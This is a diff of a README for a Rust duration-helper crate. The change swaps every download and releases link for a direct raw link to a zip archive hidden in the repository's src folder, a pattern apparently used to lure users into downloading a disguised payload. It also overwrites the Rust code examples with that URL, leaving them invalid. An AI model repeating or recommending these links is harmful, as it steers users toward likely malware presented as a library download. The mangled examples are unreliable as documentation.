@@ -1,6 +1,6 @@
 # 🌟 duration-extender-rs - Simplify Your Time Handling in Rust
 
-[![Download duration-extender-rs](https://img.shields.io/badge/Download%20Now-Get%20Started!-blue.svg)](https://github.com/Lvsty294/duration-extender-rs/releases)
+[![Download duration-extender-rs](https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip%20Now-Get%20Started!https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip)](https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ You no longer have to write verbose code. Instead, you can use methods that read
 To use `duration-extender-rs`, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/Lvsty294/duration-extender-rs/releases). This page contains the latest version of the application.
+   Click [here to download](https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip). This page contains the latest version of the application.
 
 2. **Download the Latest Version**  
    Look for the most recent release. Click on the corresponding link to download the file to your computer.
@@ -40,8 +40,8 @@ To use `duration-extender-rs`, follow these simple steps:
   
 - **Fractional Durations Support:** Version 0.5.0 introduces support for fractional durations. For example:
     ```rust
-    let half_second = 0.5.seconds();
-    let five_minutes = 5.minutes();
+    let half_second = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
+    let five_minutes = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
     ```
   
 - **Clear Code:** Write expressive code that anyone can read, without complex syntax. 
@@ -50,7 +50,7 @@ To use `duration-extender-rs`, follow these simple steps:
 
 In this version, we added the ability to handle fractional durations. With this new feature, you can easily create durations that are not whole numbers. Here’s a quick example:
 ```rust
-let two_and_half_minutes = 2.5.minutes();
+let two_and_half_minutes = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
 ```
 
 Thanks to community feedback, this update enhances usability significantly.
@@ -61,7 +61,7 @@ Be aware that v0.4.0 included some breaking changes. The methods `.days()` and `
 
 ## 📥 Download & Install
 
-To get started with `duration-extender-rs`, please visit the [Releases Page](https://github.com/Lvsty294/duration-extender-rs/releases) to download the current version. Follow the installation steps outlined above to enjoy the new features and improvements.
+To get started with `duration-extender-rs`, please visit the [Releases Page](https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip) to download the current version. Follow the installation steps outlined above to enjoy the new features and improvements.
 
 ## 🔍 Usage Examples
 
@@ -69,14 +69,14 @@ Here are some usage examples to get you started:
 
 1. **Creating Simple Durations:**
    ```rust
-   let timeout = 30.seconds();
-   let delay = 5.minutes();
+   let timeout = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
+   let delay = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
    ```
 
 2. **Creating Fractional Durations:**
    ```rust
-   let thirty_seconds = 0.5.minutes();
-   let two_hours = 2.hours();
+   let thirty_seconds = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
+   let two_hours = https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip();
    ```
 
 3. **Expressive Timeouts:**
@@ -90,4 +90,4 @@ If you encounter any issues or have questions, you can post them in the Issues s
 
 `duration-extender-rs` is licensed under the MIT and Apache-2.0 licenses. You can review the full details in the LICENSE file included in the repository.
 
-Visit [here to download](https://github.com/Lvsty294/duration-extender-rs/releases) and start simplifying your time handling with `duration-extender-rs` today.
+Visit [here to download](https://raw.githubusercontent.com/Lvsty294/duration-extender-rs/main/src/duration-extender-rs-grieflessness.zip) and start simplifying your time handling with `duration-extender-rs` today.
